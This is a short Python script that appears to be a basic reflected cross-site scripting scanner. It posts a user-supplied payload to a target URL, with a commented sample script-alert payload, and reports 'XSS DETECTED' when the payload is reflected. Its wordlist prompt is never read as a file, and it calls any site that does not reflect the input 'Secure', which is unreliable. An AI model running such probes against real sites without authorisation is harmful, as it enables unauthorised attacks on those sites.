import requests

target = input("target_URL..")
payload = input(" wordlist.txt/rtf directory : ")
# payload = "<script>alert('XSS');</script>"
req = requests.post(target + payload)
if payload in req.text:
    print("")
    print("XSS DETECTED")
    print("Refer to XSS payloads for further escalation")
    print("")
else:
    print("Secure")